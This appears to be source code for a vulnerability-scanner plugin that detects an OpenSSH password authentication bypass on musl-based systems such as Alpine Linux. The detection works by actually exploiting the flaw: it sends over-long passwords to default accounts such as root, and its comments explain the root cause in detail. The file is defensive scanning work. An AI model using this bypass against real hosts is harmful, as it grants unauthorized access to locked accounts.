/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Package opensshauthbypass detects the OpenSSH password authentication bypass
// vulnerability on musl-based systems (such as Alpine Linux).
package opensshauthbypass

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/google/goonami-scanner/common/clients/sshclient"
	"github.com/google/goonami-scanner/core/config"
	"github.com/google/goonami-scanner/core/log"
	"github.com/google/goonami-scanner/core/module"
	"github.com/google/goonami-scanner/core/net/netendpoint"
	"github.com/google/goonami-scanner/core/net/netservice"

	dpb "github.com/google/tsunami-security-scanner/proto/go/detection_go_proto"
	npb "github.com/google/tsunami-security-scanner/proto/go/network_go_proto"
	nspb "github.com/google/tsunami-security-scanner/proto/go/network_service_go_proto"
	rpb "github.com/google/tsunami-security-scanner/proto/go/reconnaissance_go_proto"
	vpb "github.com/google/tsunami-security-scanner/proto/go/vulnerability_go_proto"
	tspb "google.golang.org/protobuf/types/known/timestamppb"
)

const (
	moduleName = "dt/opensshauthbypass"

	// probePasswordLen is strictly greater than musl libc's SHA-256/SHA-512
	// KEY_MAX (256) and within OpenSSH's MAX_PASSWORD_LEN (1024), causing musl
	// crypt() to fail and return "*" (matching locked "*" shadow entries).
	probePasswordLen = 300

	// shortProbePassword is <= 256 bytes so musl crypt() hashes it normally
	// instead of returning "*".
	shortProbePassword = "goonami-invalid-short-probe"

	// maxPenaltyCooldownRetries bounds cumulative cooldown retries per confirmed
	// OpenSSH service when OpenSSH 9.8+ PerSourcePenalties temporarily drops new
	// TCP connections after failed authentication attempts.
	maxPenaltyCooldownRetries = 10

	// penaltyCooldownSleep is the backoff interval between cooldown retries on a
	// confirmed OpenSSH service, allowing OpenSSH 9.8+ PerSourcePenalties
	// (default min:15s) to expire within maxPenaltyCooldownRetries * penaltyCooldownSleep (30s).
	penaltyCooldownSleep = 3 * time.Second

	openSSHBannerPrefix = "SSH-2.0-OpenSSH"
)

// candidateUsernames lists default root and non-root accounts on Alpine Linux,
// OpenWrt, Buildroot, Yocto, and container images that commonly carry "*" in
// /etc/shadow while PermitRootLogin may be disabled.
var candidateUsernames = []string{
	"root",
	"alpine",
	"sshuser",
	"admin",
	"user",
	"guest",
}

// Module implements the module.VulnDetector interface for OpenSSH musl password
// authentication bypass detection.
type Module struct {
	*module.BaseModule
	config  *config.Config
	client  *sshclient.Client
	sleepFn func(context.Context, time.Duration) error
}

func init() {
	module.RegisterDetector(moduleName, New)
}

// New returns a new instance of the OpenSSH password authentication bypass detector.
func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
	return &Module{
		BaseModule: module.NewBaseModule(moduleName),
		config:     cfg,
		client:     sshclient.New(cfg),
		sleepFn:    sshclient.SleepContext,
	}, nil
}

// Advisories returns the base vulnerability metadata reported by this module.
func (m *Module) Advisories() []*vpb.Vulnerability {
	return []*vpb.Vulnerability{baseVulnerability()}
}

func baseVulnerability() *vpb.Vulnerability {
	return vpb.Vulnerability_builder{
		MainId: vpb.VulnerabilityId_builder{
			Publisher: "GOOGLE",
			Value:     "OPENSSH_MUSL_PASSWORD_AUTH_BYPASS",
		}.Build(),
		RelatedId: []*vpb.VulnerabilityId{
			vpb.VulnerabilityId_builder{
				Publisher: "CVE",
				Value:     "CVE-2026-123158",
			}.Build(),
		},
		Severity:       vpb.Severity_CRITICAL,
		Title:          "OpenSSH Password Authentication Bypass on musl-based Systems",
		Description:    "The OpenSSH server is vulnerable to a password authentication bypass when linked against musl libc. When authenticating an account whose shadow password field is '*' (such as default root or service accounts on Alpine Linux, OpenWrt, Buildroot, or Yocto) and at least one account on the system has a modular crypt password hash (such as SHA-512), supplying a password longer than 256 bytes causes musl's crypt() implementation to fail and return '*', matching the locked shadow entry and granting unauthorized access.",
		Recommendation: "Upgrade OpenSSH to a patched version (OpenSSH 10.6p2 or later upstream, or distro backports such as openssh 9.9_p2-r1 or later on Alpine Linux) and restart sshd, or disable password authentication (PasswordAuthentication no) in sshd_config.",
	}.Build()
}

// Detect probes the target network service for the OpenSSH + musl crypt()
// password authentication bypass vulnerability.
func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb.DetectionReportList, error) {
	ctx = log.ContextForModuleAndService(ctx, m.Name(), service)
	if err := ctx.Err(); err != nil {
		return nil, err
	}

	if netservice.IsWebService(service) || netservice.HasTLS(service) {
		return nil, nil
	}

	if proto := service.GetTransportProtocol(); proto != npb.TransportProtocol_TRANSPORT_PROTOCOL_UNSPECIFIED && proto != npb.TransportProtocol_TCP {
		return nil, nil
	}

	addr, err := netendpoint.ToURIAuthority(service.GetNetworkEndpoint())
	if err != nil {
		return nil, err
	}

	verifiedUser, vulnerable, err := m.verifyService(ctx, addr)
	if err != nil {
		return nil, err
	}
	if !vulnerable {
		return nil, nil
	}

	return buildDetectionReport(service, verifiedUser), nil
}

type authResult int

const (
	authAbortService authResult = iota
	authRejected
	authAccepted
)

type serviceProbeState struct {
	addr                    string
	confirmedOpenSSH        bool
	remainingPenaltyRetries int
}

func (m *Module) verifyService(ctx context.Context, addr string) (string, bool, error) {
	state := &serviceProbeState{
		addr:                    addr,
		remainingPenaltyRetries: maxPenaltyCooldownRetries,
	}

	firstLongPassword := strings.Repeat("A", probePasswordLen)
	secondLongPassword := strings.Repeat("B", probePasswordLen)

	for _, username := range candidateUsernames {
		// 1. Probe with a >256-byte password ("AAA..."). On vulnerable OpenSSH + musl
		// targets where /etc/shadow has '*' for username and a modular crypt salt on
		// the system, musl crypt() fails on >256 bytes and returns "*".
		res, err := m.tryPasswordWithRetry(ctx, state, username, firstLongPassword)
		if err != nil || res == authAbortService {
			return "", false, err
		}
		if res != authAccepted {
			continue
		}

		// 2. Verify with a second distinct >256-byte password ("BBB...") to rule out
		// the first probe coincidentally matching an actual password.
		res, err = m.tryPasswordWithRetry(ctx, state, username, secondLongPassword)
		if err != nil || res == authAbortService {
			return "", false, err
		}
		if res != authAccepted {
			continue
		}

		// 3. Negative validation: verify that a <=256-byte invalid password is
		// explicitly rejected to rule out honeypots or accept-all SSH servers.
		res, err = m.tryPasswordWithRetry(ctx, state, username, shortProbePassword)
		if err != nil || res == authAbortService {
			return "", false, err
		}
		if res == authAccepted {
			log.DebugContextf(ctx, log.DebugLevelService, "target accepted short invalid password for %q; continuing to next candidate account", username)
			continue
		}
		return username, true, nil
	}

	return "", false, nil
}

func (m *Module) tryPasswordWithRetry(ctx context.Context, state *serviceProbeState, username, password string) (authResult, error) {
	for {
		// We supply the password twice within the same SSH connection because on
		// OpenSSH + musl systems using /etc/shadow, the first password attempt in a
		// connection initializes pick_salt()'s static salt buffer (clobbering
		// getspnam()'s static line buffer), while the second attempt in the same
		// connection reuses the cached salt without calling getspnam(), preserving
		// pw_passwd ("*") for strcmp("*", "*").
		conn, serverVersion, err := m.client.ConnectAndReturnServerVersion(ctx, state.addr, username, password, password)
		if serverVersion != "" {
			if !strings.HasPrefix(serverVersion, openSSHBannerPrefix) {
				if conn != nil {
					_ = conn.Close()
				}
				log.DebugContextf(ctx, log.DebugLevelService, "skipping non-OpenSSH banner %q on %q", serverVersion, state.addr)
				return authAbortService, nil
			}
			state.confirmedOpenSSH = true
		}

		if err == nil {
			_ = conn.Close()
			return authAccepted, nil
		}
		if ctxErr := ctx.Err(); ctxErr != nil {
			return authAbortService, ctxErr
		}
		if errors.Is(err, sshclient.ErrPasswordAuthUnsupported) {
			log.DebugContextf(ctx, log.DebugLevelService, "password authentication unsupported on %q; stopping scan", state.addr)
			return authAbortService, nil
		}
		if errors.Is(err, sshclient.ErrAuthFailed) {
			return authRejected, nil
		}
		if state.confirmedOpenSSH &&
			errors.Is(err, sshclient.ErrNotSSHService) &&
			state.remainingPenaltyRetries > 0 {
			state.remainingPenaltyRetries--
			log.DebugContextf(ctx, log.DebugLevelRequest, "connection dropped on confirmed OpenSSH service %q (%d cooldown retries left), sleeping %s", state.addr, state.remainingPenaltyRetries, penaltyCooldownSleep)
			if sleepErr := m.sleepFn(ctx, penaltyCooldownSleep); sleepErr != nil {
				return authAbortService, sleepErr
			}
			continue
		}

		log.DebugContextf(ctx, log.DebugLevelService, "SSH probe to %q failed: %v", state.addr, err)
		return authAbortService, nil
	}
}

func buildDetectionReport(service *nspb.NetworkService, verifiedUsername string) *dpb.DetectionReportList {
	vuln := baseVulnerability()
	vuln.SetAdditionalDetails([]*vpb.AdditionalDetail{
		vpb.AdditionalDetail_builder{
			Description: "Authentication bypass verified for locked account using >256-byte password",
			TextData: vpb.TextData_builder{
				Text: fmt.Sprintf("Successfully authenticated as %q with distinct %d-byte passwords while rejecting <=256-byte passwords.", verifiedUsername, probePasswordLen),
			}.Build(),
		}.Build(),
	})

	return dpb.DetectionReportList_builder{
		DetectionReports: []*dpb.DetectionReport{
			dpb.DetectionReport_builder{
				TargetInfo: rpb.TargetInfo_builder{
					NetworkEndpoints: []*npb.NetworkEndpoint{
						service.GetNetworkEndpoint(),
					},
				}.Build(),
				NetworkService:     service,
				DetectionTimestamp: tspb.Now(),
				DetectionStatus:    dpb.DetectionStatus_VULNERABILITY_VERIFIED,
				Vulnerability:      vuln,
			}.Build(),
		},
	}.Build()
}
